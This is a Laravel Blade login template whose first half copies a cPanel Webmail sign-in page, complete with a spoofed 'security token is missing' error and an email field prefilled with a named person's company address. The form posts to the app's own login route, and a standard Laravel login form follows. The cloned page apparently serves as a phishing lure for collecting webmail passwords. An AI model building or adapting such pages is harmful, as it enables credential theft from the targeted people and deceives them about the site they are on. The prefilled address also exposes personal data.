

@extends('layouts.app')

@section('content')
<div id="login-wrapper" class="group " style="opacity: 1; visibility: visible;">
    <div class="wrapper">
    <div id="notify">
        <noscript>
            <div class="error-notice">
                <img src="/cPanel_magic_revision_1394709460/unprotected/cpanel/images/notice-error.png" alt="Error" align="left"/>
                JavaScript is disabled in your browser.
                For Webmail to function properly, you must enable JavaScript.
                If you do not enable JavaScript, certain features in Webmail will not function correctly.
            </div>
            </noscript>


        <div id="login-status" class="error-notice" style="visibility: visible">
            <div class="content-wrapper">
                <div id="login-detail">
                    <div id="login-status-icon-container"><span class="login-status-icon"></span></div>
                    <div id="login-status-message">The security token is missing from your request.</div>
                </div>
            </div>
        </div>
    </div>

    <div style="display:none">
        <div id="locale-container" style="visibility:hidden">
            <div id="locale-inner-container">
                <div id="locale-header">
                    <div class="locale-head">Please select a locale:</div>
                    <div class="close"><a href="javascript:void(0)" onclick="toggle_locales(false)">X Close</a></div>
                </div>
                <div id="locale-map">
                    <div class="scroller clear">

                            <div class="locale-cell"><a href="?locale=en">English</a></div>

                            <div class="locale-cell"><a href="?locale=ar">العربية</a></div>

                            <div class="locale-cell"><a href="?locale=bg">български</a></div>

                            <div class="locale-cell"><a href="?locale=cs">čeština</a></div>

                            <div class="locale-cell"><a href="?locale=da">dansk</a></div>

                            <div class="locale-cell"><a href="?locale=de">Deutsch</a></div>

                            <div class="locale-cell"><a href="?locale=el">Ελληνικά</a></div>

                            <div class="locale-cell"><a href="?locale=es">español</a></div>

                            <div class="locale-cell"><a href="?locale=es_419">español latinoamericano</a></div>

                            <div class="locale-cell"><a href="?locale=es_es">español de España</a></div>

                            <div class="locale-cell"><a href="?locale=fi">suomi</a></div>

                            <div class="locale-cell"><a href="?locale=fil">Filipino</a></div>

                            <div class="locale-cell"><a href="?locale=fr">français</a></div>

                            <div class="locale-cell"><a href="?locale=he">עברית</a></div>

                            <div class="locale-cell"><a href="?locale=hu">magyar</a></div>

                            <div class="locale-cell"><a href="?locale=i_cpanel_snowmen">☃ cPanel Snowmen ☃ - i_cpanel_snowmen</a></div>

                            <div class="locale-cell"><a href="?locale=i_en">i_en</a></div>

                            <div class="locale-cell"><a href="?locale=id">Bahasa Indonesia</a></div>

                            <div class="locale-cell"><a href="?locale=it">italiano</a></div>

                            <div class="locale-cell"><a href="?locale=ja">日本語</a></div>

                            <div class="locale-cell"><a href="?locale=ko">한국어</a></div>

                            <div class="locale-cell"><a href="?locale=ms">Bahasa Melayu</a></div>

                            <div class="locale-cell"><a href="?locale=nb">norsk bokmål</a></div>

                            <div class="locale-cell"><a href="?locale=nl">Nederlands</a></div>

                            <div class="locale-cell"><a href="?locale=no">Norwegian</a></div>

                            <div class="locale-cell"><a href="?locale=pl">polski</a></div>

                            <div class="locale-cell"><a href="?locale=pt">português</a></div>

                            <div class="locale-cell"><a href="?locale=pt_br">português do Brasil</a></div>

                            <div class="locale-cell"><a href="?locale=ro">română</a></div>

                            <div class="locale-cell"><a href="?locale=ru">русский</a></div>

                            <div class="locale-cell"><a href="?locale=sl">slovenščina</a></div>

                            <div class="locale-cell"><a href="?locale=sv">svenska</a></div>

                            <div class="locale-cell"><a href="?locale=th">ไทย</a></div>

                            <div class="locale-cell"><a href="?locale=tr">Türkçe</a></div>

                            <div class="locale-cell"><a href="?locale=uk">українська</a></div>

                            <div class="locale-cell"><a href="?locale=vi">Tiếng Việt</a></div>

                            <div class="locale-cell"><a href="?locale=zh">中文</a></div>

                            <div class="locale-cell"><a href="?locale=zh_cn">中文（中国）</a></div>

                            <div class="locale-cell"><a href="?locale=zh_tw">中文（台湾）</a></div>

                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="content-container">
        <div id="login-container">

            <div id="login-sub-container">
                    <div id="login-sub-header">

                        <img class="main-logo" src="/cPanel_magic_revision_1454274333/unprotected/cpanel/images/webmail-logo.svg" alt="logo">

                    </div>
                    <div id="login-sub">
                        <div id="clickthrough_form" style="visibility:hidden">
                            <form action="javascript:void(0)">
                                <div class="notices"></div>
                                <button type="submit" class="clickthrough-cont-btn">Continue</button>
                            </form>
                        </div>
                        <div id="forms">
                            <form novalidate="" id="login_form" action="/login/" method="post" target="_top" style="visibility:">
                                <div class="input-req-login"><label for="user">Email Address</label></div>
                                <div class="input-field-login icon username-container">
                                    <input name="user" id="user" autofocus="autofocus" value="janick.norman@treessolutions.com" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">
                                </div>
                                <div class="input-req-login login-password-field-label"><label for="pass">Password</label></div>
                                <div class="input-field-login icon password-container">
                                    <input name="pass" id="pass" placeholder="Enter your email password." class="std_textbox" type="password" tabindex="2" required="">
                                </div>
                                <div class="controls">
                                    <div class="login-btn">
                                        <button name="login" type="submit" id="login_submit" tabindex="3">Log in</button>
                                    </div>

                                                                    </div>
                                <div class="clear" id="push"></div>
                            </form>
                        <!--CLOSE forms -->
                        </div>
                    <!--CLOSE login-sub -->
                    </div>


                                    <!--CLOSE wrapper -->
                </div>
            <!--CLOSE login-sub-container -->
            </div>
        <!--CLOSE login-container -->
        </div>

                <div id="locale-footer" style="display: block;">
            <div class="locale-container">
                <noscript>
                    <form method="get" action=".">
                        <select name="locale">
                            <option value="">Change locale</option>
                            <option value='en'>English</option><option value='ar'>العربية</option><option value='bg'>български</option><option value='cs'>čeština</option><option value='da'>dansk</option><option value='de'>Deutsch</option><option value='el'>Ελληνικά</option><option value='es'>español</option><option value='es_419'>español latinoamericano</option><option value='es_es'>español de España</option><option value='fi'>suomi</option><option value='fil'>Filipino</option><option value='fr'>français</option><option value='he'>עברית</option><option value='hu'>magyar</option><option value='i_cpanel_snowmen'>☃ cPanel Snowmen ☃ - i_cpanel_snowmen</option><option value='i_en'>i_en</option><option value='id'>Bahasa Indonesia</option><option value='it'>italiano</option><option value='ja'>日本語</option><option value='ko'>한국어</option><option value='ms'>Bahasa Melayu</option><option value='nb'>norsk bokmål</option><option value='nl'>Nederlands</option><option value='no'>Norwegian</option><option value='pl'>polski</option><option value='pt'>português</option><option value='pt_br'>português do Brasil</option><option value='ro'>română</option><option value='ru'>русский</option><option value='sl'>slovenščina</option><option value='sv'>svenska</option><option value='th'>ไทย</option><option value='tr'>Türkçe</option><option value='uk'>українська</option><option value='vi'>Tiếng Việt</option><option value='zh'>中文</option><option value='zh_cn'>中文（中国）</option><option value='zh_tw'>中文（台湾）</option>                        </select>
                        <button style="margin-left: 10px" type="submit">Change</button>
                    </form>
                    <style type="text/css">#mobilelocalemenu, #locales_list {display:none}</style>
                </noscript>
                <ul id="locales_list">


                        <li><a href="/?locale=en">English</a></li>


                        <li><a href="/?locale=ar">العربية</a></li>


                        <li><a href="/?locale=bg">български</a></li>


                        <li><a href="/?locale=cs">čeština</a></li>


                        <li><a href="/?locale=da">dansk</a></li>


                        <li><a href="/?locale=de">Deutsch</a></li>


                        <li><a href="/?locale=el">Ελληνικά</a></li>


                        <li><a href="/?locale=es">español</a></li>


                    <li><a href="javascript:void(0)" id="morelocale" onclick="toggle_locales(true)" title="More locales">…</a></li>
                </ul>
                <div id="mobilelocalemenu">Select a locale:
                    <a href="javascript:void(0)" onclick="toggle_locales(true)" title="Change locale">English</a>
                </div>
            </div>
        </div>
    </div>
<!--Close login-wrapper -->
</div>

<div class="container">
    <div class="row justify-content-center">
        <div class="col-md-8">
            <div class="card">
                <div class="card-header">{{ __('Login') }}</div>

                <div class="card-body">
                    <form method="POST" action="{{ route('login') }}" aria-label="{{ __('Login') }}">
                        @csrf

                        <div class="form-group row">
                            <label for="email" class="col-sm-4 col-form-label text-md-right">{{ __('E-Mail Address') }}</label>

                            <div class="col-md-6">
                                <input id="email" type="email" class="form-control{{ $errors->has('email') ? ' is-invalid' : '' }}" name="email" value="{{ old('email') }}" required autofocus>

                                @if ($errors->has('email'))
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $errors->first('email') }}</strong>
                                    </span>
                                @endif
                            </div>
                        </div>

                        <div class="form-group row">
                            <label for="password" class="col-md-4 col-form-label text-md-right">{{ __('Password') }}</label>

                            <div class="col-md-6">
                                <input id="password" type="password" class="form-control{{ $errors->has('password') ? ' is-invalid' : '' }}" name="password" required>

                                @if ($errors->has('password'))
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $errors->first('password') }}</strong>
                                    </span>
                                @endif
                            </div>
                        </div>

                        <div class="form-group row">
                            <div class="col-md-6 offset-md-4">
                                <div class="checkbox">
                                    <label>
                                        <input type="checkbox" name="remember" {{ old('remember') ? 'checked' : '' }}> {{ __('Remember Me') }}
                                    </label>
                                </div>
                            </div>
                        </div>

                        <div class="form-group row mb-0">
                            <div class="col-md-8 offset-md-4">
                                <button type="submit" class="btn btn-primary">
                                    {{ __('Login') }}
                                </button>

                                <a class="btn btn-link" href="{{ route('password.request') }}">
                                    {{ __('Forgot Your Password?') }}
                                </a>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
@endsection
